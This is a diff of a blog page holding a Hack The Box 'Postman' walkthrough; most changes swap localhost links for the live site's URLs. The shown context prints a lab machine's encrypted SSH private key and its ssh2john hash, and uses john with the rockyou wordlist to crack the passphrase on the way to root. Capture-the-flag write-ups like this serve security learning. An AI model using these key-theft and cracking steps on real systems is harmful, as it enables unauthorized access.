@@ -5,24 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Postman Writeup / Walkthrough Hack the box</title>
 
-  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=171309cba3">
-  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=171309cba3">
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=a0628fd116">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=a0628fd116">
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link rel="stylesheet" href="/assets/css/style.css?v=171309cba3">
+  <link rel="stylesheet" href="/assets/css/style.css?v=a0628fd116">
 
   <meta name="description" content="This is a Writeup for Postman it is Linux challenge on hack the box, in Postman we&#x27;ll learn about redis exploitation to get initial access">
-    <link rel="canonical" href="http://localhost:8080/blog/postman-writeup-walkthrough-hack-the-box/">
+    <link rel="canonical" href="https://sheerazali.com/blog/postman-writeup-walkthrough-hack-the-box/">
     <meta name="referrer" content="no-referrer-when-downgrade">
     
     <meta property="og:site_name" content="Sheeraz Ali">
     <meta property="og:type" content="article">
     <meta property="og:title" content="Postman Writeup / Walkthrough Hack the box">
     <meta property="og:description" content="This is a Writeup for Postman it is Linux challenge on hack the box, in Postman we&#x27;ll learn about redis exploitation to get initial access">
-    <meta property="og:url" content="http://localhost:8080/blog/postman-writeup-walkthrough-hack-the-box/">
+    <meta property="og:url" content="https://sheerazali.com/blog/postman-writeup-walkthrough-hack-the-box/">
     <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix-2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
     <meta property="article:published_time" content="2019-11-29T08:20:40.000Z">
     <meta property="article:modified_time" content="2020-03-14T16:13:51.000Z">
@@ -33,7 +33,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Postman Writeup / Walkthrough Hack the box">
     <meta name="twitter:description" content="This is a Writeup for Postman it is Linux challenge on hack the box, in Postman we&#x27;ll learn about redis exploitation to get initial access">
-    <meta name="twitter:url" content="http://localhost:8080/blog/postman-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/postman-writeup-walkthrough-hack-the-box/">
     <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix-2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
     <meta name="twitter:label1" content="Written by">
     <meta name="twitter:data1" content="sheeraz ali">
@@ -50,10 +50,12 @@
     "publisher": {
         "@type": "Organization",
         "name": "Sheeraz Ali",
-        "url": "http://localhost:8080/",
+        "url": "https://sheerazali.com/",
         "logo": {
             "@type": "ImageObject",
-            "url": "http://localhost:8080/favicon.ico"
+            "url": "https://sheerazali.com/favicon.ico",
+            "width": 48,
+            "height": 48
         }
     },
     "author": {
@@ -65,11 +67,11 @@
             "width": 250,
             "height": 250
         },
-        "url": "http://localhost:8080/author/sheeraz/",
+        "url": "https://sheerazali.com/author/sheeraz/",
         "sameAs": []
     },
     "headline": "Postman Writeup / Walkthrough Hack the box",
-    "url": "http://localhost:8080/blog/postman-writeup-walkthrough-hack-the-box/",
+    "url": "https://sheerazali.com/blog/postman-writeup-walkthrough-hack-the-box/",
     "datePublished": "2019-11-29T08:20:40.000Z",
     "dateModified": "2020-03-14T16:13:51.000Z",
     "image": {
@@ -80,13 +82,13 @@
     },
     "keywords": "HackTheBox, Writeup",
     "description": "This is a Writeup for Postman it is Linux challenge on hack the box, in Postman we&#x27;ll learn about redis exploitation to get initial access",
-    "mainEntityOfPage": "http://localhost:8080/blog/postman-writeup-walkthrough-hack-the-box/"
+    "mainEntityOfPage": "https://sheerazali.com/blog/postman-writeup-walkthrough-hack-the-box/"
 }
     </script>
 
     <meta name="generator" content="Ghost 5.130">
-    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="http://localhost:8080/rss/">
-    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="http://localhost:8080/" data-key="15f06e61ecb8d951198e7015b6" data-api="http://localhost:8080/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
 .gh-post-upgrade-cta {
     display: flex;
     flex-direction: column;
@@ -150,12 +152,12 @@
 .gh-post-upgrade-cta a.gh-btn:hover {
     opacity: 0.92;
 }</style>
-    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="http://localhost:8080/" data-locale="en" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
     
-    <link href="http://localhost:8080/webmentions/receive/" rel="webmention">
-    <script defer src="/public/cards.min.js?v=171309cba3"></script>
-    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=171309cba3">
-    <script defer src="/public/member-attribution.min.js?v=171309cba3"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=a0628fd116"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=a0628fd116">
+    <script defer src="/public/member-attribution.min.js?v=a0628fd116"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
 </head>
 <body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
 
@@ -165,7 +167,7 @@
   <div class="container">
     <div class="header-content">
 
-      <a href="http://localhost:8080/" class="site-logo">
+      <a href="https://sheerazali.com/" class="site-logo">
         <img src="/assets/images/logo.png" alt="Sheeraz Ali">
       </a>
 
@@ -176,12 +178,12 @@
 
       <nav class="main-nav">
         <ul>
-          <li><a href="http://localhost:8080/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
           <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
           <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
           <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
           <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
-          <li><a href="http://localhost:8080/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
         </ul>
       </nav>
 
@@ -203,7 +205,7 @@
 
     <header class="post-header">
       <div class="post-meta-top">
-        <a href="http://localhost:8080/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
         <span class="post-date">November 29, 2019</span>
         <span class="reading-time">7 min read</span>
       </div>
@@ -212,7 +214,7 @@
 
       <div class="post-author">
         <span class="author-label">Author:</span>
-        <a href="http://localhost:8080/author/sheeraz/">sheeraz ali</a>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
       </div>
     </header>
 
@@ -297,7 +299,7 @@ MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
 a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
 SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
 NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
-PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K</code></pre><p>To transfer it to my computer to crack the passphrase I base64’d the key and then base64 -d to decode it back to an ssh key and saved it ass Matt.key you can cat it out to verify if it is a complete ssh private key.</p><pre><code class="language-bash">root@kali:~/Desktop/HackTheBox-Machines/Postman echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d &gt; Matts.KEy </code></pre><p>I cracked the ssh key using ssh2john to take a hash of the private key to bruteforce it for passphrase. I have explained this technique in more details in <a href="http://localhost:8080/heist-writeup-hack-the-box/">Heist writeup</a>.</p><pre><code class="language-bash">root@kali:~/Desktop/HackTheBox-Machines/Postman# /opt/JohnTheRipper/run/ssh2john.py Matts.KEy
+PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K</code></pre><p>To transfer it to my computer to crack the passphrase I base64’d the key and then base64 -d to decode it back to an ssh key and saved it ass Matt.key you can cat it out to verify if it is a complete ssh private key.</p><pre><code class="language-bash">root@kali:~/Desktop/HackTheBox-Machines/Postman echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d &gt; Matts.KEy </code></pre><p>I cracked the ssh key using ssh2john to take a hash of the private key to bruteforce it for passphrase. I have explained this technique in more details in <a href="https://sheerazali.com/heist-writeup-hack-the-box/">Heist writeup</a>.</p><pre><code class="language-bash">root@kali:~/Desktop/HackTheBox-Machines/Postman# /opt/JohnTheRipper/run/ssh2john.py Matts.KEy
 Matts.KEy:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
 
 root@kali:~/Desktop/HackTheBox-Machines/Postman# /opt/JohnTheRipper/run/ssh2john.py Matts.KEy &gt; mattsHash</code></pre><p>Now got the hash in a file called mattHash if you see the last line. Now we’ll use john to brute-force it.</p><pre><code class="language-bash">root@kali:~/Desktop/HackTheBox-Machines/Postman#  john --wordlist=/usr/share/wordlists/rockyou.txt HashMatt
@@ -471,7 +473,7 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Whooh we got root on postm
 
 </div>
 
-<script src="/assets/js/main.js?v=171309cba3"></script>
+<script src="/assets/js/main.js?v=a0628fd116"></script>
 
 
 </body>
